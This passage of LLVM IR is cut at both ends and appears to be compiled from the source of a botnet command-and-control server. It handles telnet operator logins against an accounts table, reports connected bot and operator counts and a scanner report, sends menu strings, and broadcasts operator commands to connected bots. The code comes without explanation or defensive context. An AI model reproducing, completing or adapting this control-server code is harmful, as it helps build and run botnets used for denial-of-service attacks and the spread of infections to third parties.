  %162 = call i64 @send(i32 %158, i8* %159, i64 %161, i32 16384)
  %163 = icmp eq i64 %162, -1
  br i1 %163, label %164, label %165

164:                                              ; preds = %150
  br label %753

165:                                              ; preds = %150
  %166 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %167 = load i32, i32* %4, align 4
  %168 = call i32 @fdgets(i8* %166, i32 2048, i32 %167)
  %169 = icmp slt i32 %168, 1
  br i1 %169, label %170, label %171

170:                                              ; preds = %165
  br label %753

171:                                              ; preds = %165
  %172 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %172)
  %173 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %174 = load i32, i32* %5, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %175
  %177 = getelementptr inbounds %struct.login_info, %struct.login_info* %176, i32 0, i32 1
  %178 = getelementptr inbounds [100 x i8], [100 x i8]* %177, i64 0, i64 0
  %179 = call i32 @strcmp(i8* %173, i8* %178) #8
  %180 = icmp ne i32 %179, 0
  br i1 %180, label %181, label %182

181:                                              ; preds = %171
  br label %185

182:                                              ; preds = %171
  %183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %183, i8 0, i64 2048, i1 false)
  br label %191

184:                                              ; preds = %122
  br label %185

185:                                              ; preds = %184, %181
  %186 = load i32, i32* %4, align 4
  %187 = call i64 @send(i32 %186, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.18, i64 0, i64 0), i64 5, i32 16384)
  %188 = icmp eq i64 %187, -1
  br i1 %188, label %189, label %190

189:                                              ; preds = %185
  br label %753

190:                                              ; preds = %185
  br label %753

191:                                              ; preds = %182
  %192 = load i8*, i8** %3, align 8
  %193 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %192) #9
  %194 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %195 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.22, i64 0, i64 0)) #9
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %197 = call i32 (i8*, i8*, ...) @sprintf(i8* %196, i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.23, i64 0, i64 0)) #9
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.24, i64 0, i64 0)) #9
  %200 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %201 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.25, i64 0, i64 0)) #9
  %202 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %202, i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i64 0, i64 0)) #9
  %204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %205 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([113 x i8], [113 x i8]* @.str.27, i64 0, i64 0)) #9
  %206 = getelementptr inbounds [5000 x i8], [5000 x i8]* %27, i64 0, i64 0
  %207 = call i32 (i8*, i8*, ...) @sprintf(i8* %206, i8* getelementptr inbounds ([105 x i8], [105 x i8]* @.str.28, i64 0, i64 0)) #9
  %208 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %209 = call i32 (i8*, i8*, ...) @sprintf(i8* %208, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.29, i64 0, i64 0)) #9
  %210 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %211 = call i32 (i8*, i8*, ...) @sprintf(i8* %210, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.30, i64 0, i64 0)) #9
  %212 = load i32, i32* %4, align 4
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %214 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %215 = call i64 @strlen(i8* %214) #8
  %216 = call i64 @send(i32 %212, i8* %213, i64 %215, i32 16384)
  %217 = icmp eq i64 %216, -1
  br i1 %217, label %218, label %219

218:                                              ; preds = %191
  br label %753

219:                                              ; preds = %191
  %220 = load i32, i32* %4, align 4
  %221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %222 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %223 = call i64 @strlen(i8* %222) #8
  %224 = call i64 @send(i32 %220, i8* %221, i64 %223, i32 16384)
  %225 = icmp eq i64 %224, -1
  br i1 %225, label %226, label %227

226:                                              ; preds = %219
  br label %753

227:                                              ; preds = %219
  %228 = load i32, i32* %4, align 4
  %229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %230 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %231 = call i64 @strlen(i8* %230) #8
  %232 = call i64 @send(i32 %228, i8* %229, i64 %231, i32 16384)
  %233 = icmp eq i64 %232, -1
  br i1 %233, label %234, label %235

234:                                              ; preds = %227
  br label %753

235:                                              ; preds = %227
  %236 = load i32, i32* %4, align 4
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %238 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %239 = call i64 @strlen(i8* %238) #8
  %240 = call i64 @send(i32 %236, i8* %237, i64 %239, i32 16384)
  %241 = icmp eq i64 %240, -1
  br i1 %241, label %242, label %243

242:                                              ; preds = %235
  br label %753

243:                                              ; preds = %235
  %244 = load i32, i32* %4, align 4
  %245 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %246 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %247 = call i64 @strlen(i8* %246) #8
  %248 = call i64 @send(i32 %244, i8* %245, i64 %247, i32 16384)
  %249 = icmp eq i64 %248, -1
  br i1 %249, label %250, label %251

250:                                              ; preds = %243
  br label %753

251:                                              ; preds = %243
  %252 = load i32, i32* %4, align 4
  %253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %254 = getelementptr inbounds [5000 x i8], [5000 x i8]* %26, i64 0, i64 0
  %255 = call i64 @strlen(i8* %254) #8
  %256 = call i64 @send(i32 %252, i8* %253, i64 %255, i32 16384)
  %257 = icmp eq i64 %256, -1
  br i1 %257, label %258, label %259

258:                                              ; preds = %251
  br label %753

259:                                              ; preds = %251
  %260 = load i32, i32* %4, align 4
  %261 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %262 = getelementptr inbounds [5000 x i8], [5000 x i8]* %28, i64 0, i64 0
  %263 = call i64 @strlen(i8* %262) #8
  %264 = call i64 @send(i32 %260, i8* %261, i64 %263, i32 16384)
  %265 = icmp eq i64 %264, -1
  br i1 %265, label %266, label %267

266:                                              ; preds = %259
  br label %753

267:                                              ; preds = %259
  %268 = load i32, i32* %4, align 4
  %269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %270 = getelementptr inbounds [5000 x i8], [5000 x i8]* %29, i64 0, i64 0
  %271 = call i64 @strlen(i8* %270) #8
  %272 = call i64 @send(i32 %268, i8* %269, i64 %271, i32 16384)
  %273 = icmp eq i64 %272, -1
  br i1 %273, label %274, label %275

274:                                              ; preds = %267
  br label %753

275:                                              ; preds = %267
  br label %276

276:                                              ; preds = %275
  %277 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %279
  %281 = getelementptr inbounds %struct.login_info, %struct.login_info* %280, i32 0, i32 0
  %282 = getelementptr inbounds [100 x i8], [100 x i8]* %281, i64 0, i64 0
  %283 = call i32 (i8*, i8*, ...) @sprintf(i8* %277, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %282) #9
  %284 = load i32, i32* %4, align 4
  %285 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %286 = getelementptr inbounds [5000 x i8], [5000 x i8]* %30, i64 0, i64 0
  %287 = call i64 @strlen(i8* %286) #8
  %288 = call i64 @send(i32 %284, i8* %285, i64 %287, i32 16384)
  %289 = icmp eq i64 %288, -1
  br i1 %289, label %290, label %291

290:                                              ; preds = %276
  br label %753

291:                                              ; preds = %276
  br label %292

292:                                              ; preds = %291
  %293 = load i8*, i8** %3, align 8
  %294 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %293) #9
  %295 = load i32, i32* %4, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %296
  %298 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %297, i32 0, i32 0
  store i32 1, i32* %298, align 4
  br label %299

299:                                              ; preds = %719, %718, %675, %570, %535, %431, %357, %292
  %300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %301 = load i32, i32* %4, align 4
  %302 = call i32 @fdgets(i8* %300, i32 2048, i32 %301)
  %303 = icmp sgt i32 %302, 0
  br i1 %303, label %304, label %752

304:                                              ; preds = %299
  %305 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %306 = call i8* @strstr(i8* %305, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.32, i64 0, i64 0)) #8
  %307 = icmp ne i8* %306, null
  br i1 %307, label %308, label %358

308:                                              ; preds = %304
  %309 = getelementptr inbounds [2048 x i8], [2048 x i8]* %31, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %309, i8 0, i64 2048, i1 false)
  %310 = getelementptr inbounds [2048 x i8], [2048 x i8]* %32, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %310, i8 0, i64 2048, i1 false)
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %31, i64 0, i64 0
  %312 = call i32 @BotsConnected()
  %313 = load volatile i32, i32* @OperatorsConnected, align 4
  %314 = call i32 (i8*, i8*, ...) @sprintf(i8* %311, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.33, i64 0, i64 0), i32 %312, i32 %313) #9
  %315 = getelementptr inbounds [2048 x i8], [2048 x i8]* %33, i64 0, i64 0
  %316 = load volatile i32, i32* @OperatorsConnected, align 4
  %317 = load volatile i32, i32* @scannerreport, align 4
  %318 = call i32 (i8*, i8*, ...) @sprintf(i8* %315, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.34, i64 0, i64 0), i32 %316, i32 %317) #9
  %319 = load i32, i32* %4, align 4
  %320 = getelementptr inbounds [2048 x i8], [2048 x i8]* %31, i64 0, i64 0
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %31, i64 0, i64 0
  %322 = call i64 @strlen(i8* %321) #8
  %323 = call i64 @send(i32 %319, i8* %320, i64 %322, i32 16384)
  %324 = icmp eq i64 %323, -1
  br i1 %324, label %325, label %326

325:                                              ; preds = %308
  store i8* null, i8** %2, align 8
  br label %762

326:                                              ; preds = %308
  %327 = load i32, i32* %4, align 4
  %328 = getelementptr inbounds [2048 x i8], [2048 x i8]* %32, i64 0, i64 0
  %329 = getelementptr inbounds [2048 x i8], [2048 x i8]* %32, i64 0, i64 0
  %330 = call i64 @strlen(i8* %329) #8
  %331 = call i64 @send(i32 %327, i8* %328, i64 %330, i32 16384)
  %332 = icmp eq i64 %331, -1
  br i1 %332, label %333, label %334

333:                                              ; preds = %326
  store i8* null, i8** %2, align 8
  br label %762

334:                                              ; preds = %326
  %335 = load i32, i32* %4, align 4
  %336 = getelementptr inbounds [2048 x i8], [2048 x i8]* %33, i64 0, i64 0
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %33, i64 0, i64 0
  %338 = call i64 @strlen(i8* %337) #8
  %339 = call i64 @send(i32 %335, i8* %336, i64 %338, i32 16384)
  %340 = icmp eq i64 %339, -1
  br i1 %340, label %341, label %342

341:                                              ; preds = %334
  store i8* null, i8** %2, align 8
  br label %762

342:                                              ; preds = %334
  %343 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %344 = load i32, i32* %5, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %345
  %347 = getelementptr inbounds %struct.login_info, %struct.login_info* %346, i32 0, i32 0
  %348 = getelementptr inbounds [100 x i8], [100 x i8]* %347, i64 0, i64 0
  %349 = call i32 (i8*, i8*, ...) @sprintf(i8* %343, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %348) #9
  %350 = load i32, i32* %4, align 4
  %351 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %352 = getelementptr inbounds [5000 x i8], [5000 x i8]* %34, i64 0, i64 0
  %353 = call i64 @strlen(i8* %352) #8
  %354 = call i64 @send(i32 %350, i8* %351, i64 %353, i32 16384)
  %355 = icmp eq i64 %354, -1
  br i1 %355, label %356, label %357

356:                                              ; preds = %342
  br label %753

357:                                              ; preds = %342
  br label %299, !llvm.loop !19

358:                                              ; preds = %304
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %360 = call i8* @strstr(i8* %359, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i64 0, i64 0)) #8
  %361 = icmp ne i8* %360, null
  br i1 %361, label %362, label %432

362:                                              ; preds = %358
  %363 = load i8*, i8** %3, align 8
  %364 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %363) #9
  %365 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %366 = call i32 (i8*, i8*, ...) @sprintf(i8* %365, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.36, i64 0, i64 0)) #9
  %367 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %368 = call i32 (i8*, i8*, ...) @sprintf(i8* %367, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.37, i64 0, i64 0)) #9
  %369 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %370 = call i32 (i8*, i8*, ...) @sprintf(i8* %369, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.38, i64 0, i64 0)) #9
  %371 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %372 = call i32 (i8*, i8*, ...) @sprintf(i8* %371, i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.39, i64 0, i64 0)) #9
  %373 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %374 = call i32 (i8*, i8*, ...) @sprintf(i8* %373, i8* getelementptr inbounds ([50 x i8], [50 x i8]* @.str.40, i64 0, i64 0)) #9
  %375 = load i32, i32* %4, align 4
  %376 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %377 = getelementptr inbounds [800 x i8], [800 x i8]* %35, i64 0, i64 0
  %378 = call i64 @strlen(i8* %377) #8
  %379 = call i64 @send(i32 %375, i8* %376, i64 %378, i32 16384)
  %380 = icmp eq i64 %379, -1
  br i1 %380, label %381, label %382

381:                                              ; preds = %362
  br label %753

382:                                              ; preds = %362
  %383 = load i32, i32* %4, align 4
  %384 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %385 = getelementptr inbounds [800 x i8], [800 x i8]* %36, i64 0, i64 0
  %386 = call i64 @strlen(i8* %385) #8
  %387 = call i64 @send(i32 %383, i8* %384, i64 %386, i32 16384)
  %388 = icmp eq i64 %387, -1
  br i1 %388, label %389, label %390

389:                                              ; preds = %382
  br label %753

390:                                              ; preds = %382
  %391 = load i32, i32* %4, align 4
  %392 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %393 = getelementptr inbounds [800 x i8], [800 x i8]* %37, i64 0, i64 0
  %394 = call i64 @strlen(i8* %393) #8
  %395 = call i64 @send(i32 %391, i8* %392, i64 %394, i32 16384)
  %396 = icmp eq i64 %395, -1
  br i1 %396, label %397, label %398

397:                                              ; preds = %390
  br label %753

398:                                              ; preds = %390
  %399 = load i32, i32* %4, align 4
  %400 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %401 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %402 = call i64 @strlen(i8* %401) #8
  %403 = call i64 @send(i32 %399, i8* %400, i64 %402, i32 16384)
  %404 = icmp eq i64 %403, -1
  br i1 %404, label %405, label %406

405:                                              ; preds = %398
  br label %753

406:                                              ; preds = %398
  %407 = load i32, i32* %4, align 4
  %408 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %409 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %410 = call i64 @strlen(i8* %409) #8
  %411 = call i64 @send(i32 %407, i8* %408, i64 %410, i32 16384)
  %412 = icmp eq i64 %411, -1
  br i1 %412, label %413, label %414

413:                                              ; preds = %406
  br label %753

414:                                              ; preds = %406
  %415 = load i8*, i8** %3, align 8
  %416 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %415) #9
  %417 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %418 = load i32, i32* %5, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %419
  %421 = getelementptr inbounds %struct.login_info, %struct.login_info* %420, i32 0, i32 0
  %422 = getelementptr inbounds [100 x i8], [100 x i8]* %421, i64 0, i64 0
  %423 = call i32 (i8*, i8*, ...) @sprintf(i8* %417, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %422) #9
  %424 = load i32, i32* %4, align 4
  %425 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %426 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %427 = call i64 @strlen(i8* %426) #8
  %428 = call i64 @send(i32 %424, i8* %425, i64 %427, i32 16384)
  %429 = icmp eq i64 %428, -1
  br i1 %429, label %430, label %431

430:                                              ; preds = %414
  br label %753

431:                                              ; preds = %414
  br label %299, !llvm.loop !19

432:                                              ; preds = %358
  %433 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %434 = call i8* @strstr(i8* %433, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i64 0, i64 0)) #8
  %435 = icmp ne i8* %434, null
  br i1 %435, label %436, label %536

436:                                              ; preds = %432
  %437 = load i8*, i8** %3, align 8
  %438 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %437) #9
  %439 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %440 = call i32 (i8*, i8*, ...) @sprintf(i8* %439, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.42, i64 0, i64 0)) #9
  %441 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %442 = call i32 (i8*, i8*, ...) @sprintf(i8* %441, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.43, i64 0, i64 0)) #9
  %443 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %444 = call i32 (i8*, i8*, ...) @sprintf(i8* %443, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.44, i64 0, i64 0)) #9
  %445 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %446 = call i32 (i8*, i8*, ...) @sprintf(i8* %445, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.45, i64 0, i64 0)) #9
  %447 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %448 = call i32 (i8*, i8*, ...) @sprintf(i8* %447, i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.46, i64 0, i64 0)) #9
  %449 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %450 = call i32 (i8*, i8*, ...) @sprintf(i8* %449, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.47, i64 0, i64 0)) #9
  %451 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %452 = call i32 (i8*, i8*, ...) @sprintf(i8* %451, i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.48, i64 0, i64 0)) #9
  %453 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %454 = call i32 (i8*, i8*, ...) @sprintf(i8* %453, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.49, i64 0, i64 0)) #9
  %455 = load i32, i32* %4, align 4
  %456 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %457 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %458 = call i64 @strlen(i8* %457) #8
  %459 = call i64 @send(i32 %455, i8* %456, i64 %458, i32 16384)
  %460 = icmp eq i64 %459, -1
  br i1 %460, label %461, label %462

461:                                              ; preds = %436
  br label %753

462:                                              ; preds = %436
  %463 = load i32, i32* %4, align 4
  %464 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %465 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %466 = call i64 @strlen(i8* %465) #8
  %467 = call i64 @send(i32 %463, i8* %464, i64 %466, i32 16384)
  %468 = icmp eq i64 %467, -1
  br i1 %468, label %469, label %470

469:                                              ; preds = %462
  br label %753

470:                                              ; preds = %462
  %471 = load i32, i32* %4, align 4
  %472 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %473 = getelementptr inbounds [800 x i8], [800 x i8]* %43, i64 0, i64 0
  %474 = call i64 @strlen(i8* %473) #8
  %475 = call i64 @send(i32 %471, i8* %472, i64 %474, i32 16384)
  %476 = icmp eq i64 %475, -1
  br i1 %476, label %477, label %478

477:                                              ; preds = %470
  br label %753

478:                                              ; preds = %470
  %479 = load i32, i32* %4, align 4
  %480 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %481 = getelementptr inbounds [800 x i8], [800 x i8]* %44, i64 0, i64 0
  %482 = call i64 @strlen(i8* %481) #8
  %483 = call i64 @send(i32 %479, i8* %480, i64 %482, i32 16384)
  %484 = icmp eq i64 %483, -1
  br i1 %484, label %485, label %486

485:                                              ; preds = %478
  br label %753

486:                                              ; preds = %478
  %487 = load i32, i32* %4, align 4
  %488 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %489 = getelementptr inbounds [800 x i8], [800 x i8]* %45, i64 0, i64 0
  %490 = call i64 @strlen(i8* %489) #8
  %491 = call i64 @send(i32 %487, i8* %488, i64 %490, i32 16384)
  %492 = icmp eq i64 %491, -1
  br i1 %492, label %493, label %494

493:                                              ; preds = %486
  br label %753

494:                                              ; preds = %486
  %495 = load i32, i32* %4, align 4
  %496 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %497 = getelementptr inbounds [800 x i8], [800 x i8]* %46, i64 0, i64 0
  %498 = call i64 @strlen(i8* %497) #8
  %499 = call i64 @send(i32 %495, i8* %496, i64 %498, i32 16384)
  %500 = icmp eq i64 %499, -1
  br i1 %500, label %501, label %502

501:                                              ; preds = %494
  br label %753

502:                                              ; preds = %494
  %503 = load i32, i32* %4, align 4
  %504 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %505 = getelementptr inbounds [800 x i8], [800 x i8]* %47, i64 0, i64 0
  %506 = call i64 @strlen(i8* %505) #8
  %507 = call i64 @send(i32 %503, i8* %504, i64 %506, i32 16384)
  %508 = icmp eq i64 %507, -1
  br i1 %508, label %509, label %510

509:                                              ; preds = %502
  br label %753

510:                                              ; preds = %502
  %511 = load i32, i32* %4, align 4
  %512 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %513 = getelementptr inbounds [800 x i8], [800 x i8]* %48, i64 0, i64 0
  %514 = call i64 @strlen(i8* %513) #8
  %515 = call i64 @send(i32 %511, i8* %512, i64 %514, i32 16384)
  %516 = icmp eq i64 %515, -1
  br i1 %516, label %517, label %518

517:                                              ; preds = %510
  br label %753

518:                                              ; preds = %510
  %519 = load i8*, i8** %3, align 8
  %520 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %519) #9
  %521 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %522 = load i32, i32* %5, align 4
  %523 = sext i32 %522 to i64
  %524 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %523
  %525 = getelementptr inbounds %struct.login_info, %struct.login_info* %524, i32 0, i32 0
  %526 = getelementptr inbounds [100 x i8], [100 x i8]* %525, i64 0, i64 0
  %527 = call i32 (i8*, i8*, ...) @sprintf(i8* %521, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %526) #9
  %528 = load i32, i32* %4, align 4
  %529 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %530 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %531 = call i64 @strlen(i8* %530) #8
  %532 = call i64 @send(i32 %528, i8* %529, i64 %531, i32 16384)
  %533 = icmp eq i64 %532, -1
  br i1 %533, label %534, label %535

534:                                              ; preds = %518
  br label %753

535:                                              ; preds = %518
  br label %299, !llvm.loop !19

536:                                              ; preds = %432
  %537 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %538 = call i8* @strstr(i8* %537, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i64 0, i64 0)) #8
  %539 = icmp ne i8* %538, null
  br i1 %539, label %540, label %571

540:                                              ; preds = %536
  %541 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %541, i8 0, i64 2048, i1 false)
  %542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  %543 = call i32 (i8*, i8*, ...) @sprintf(i8* %542, i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.51, i64 0, i64 0)) #9
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  %545 = load i32, i32* %4, align 4
  call void @broadcast(i8* %544, i32 %545, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i64 0, i64 0))
  %546 = load i32, i32* %4, align 4
  %547 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  %548 = getelementptr inbounds [2048 x i8], [2048 x i8]* %50, i64 0, i64 0
  %549 = call i64 @strlen(i8* %548) #8
  %550 = call i64 @send(i32 %546, i8* %547, i64 %549, i32 16384)
  %551 = icmp eq i64 %550, -1
  br i1 %551, label %552, label %553

552:                                              ; preds = %540
  br label %753

553:                                              ; preds = %540
  br label %554

554:                                              ; preds = %553
  %555 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %556 = load i32, i32* %5, align 4
  %557 = sext i32 %556 to i64
  %558 = getelementptr inbounds [100 x %struct.login_info], [100 x %struct.login_info]* @accounts, i64 0, i64 %557
  %559 = getelementptr inbounds %struct.login_info, %struct.login_info* %558, i32 0, i32 0
  %560 = getelementptr inbounds [100 x i8], [100 x i8]* %559, i64 0, i64 0
  %561 = call i32 (i8*, i8*, ...) @sprintf(i8* %555, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.31, i64 0, i64 0), i8* %560) #9
  %562 = load i32, i32* %4, align 4
  %563 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %564 = getelementptr inbounds [5000 x i8], [5000 x i8]* %52, i64 0, i64 0
  %565 = call i64 @strlen(i8* %564) #8
  %566 = call i64 @send(i32 %562, i8* %563, i64 %565, i32 16384)
  %567 = icmp eq i64 %566, -1
  br i1 %567, label %568, label %569

568:                                              ; preds = %554
  br label %753

569:                                              ; preds = %554
  br label %570

570:                                              ; preds = %569
  br label %299, !llvm.loop !19

571:                                              ; preds = %536
  %572 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %573 = call i8* @strstr(i8* %572, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.53, i64 0, i64 0)) #8
  %574 = icmp ne i8* %573, null
  br i1 %574, label %575, label %676

575:                                              ; preds = %571
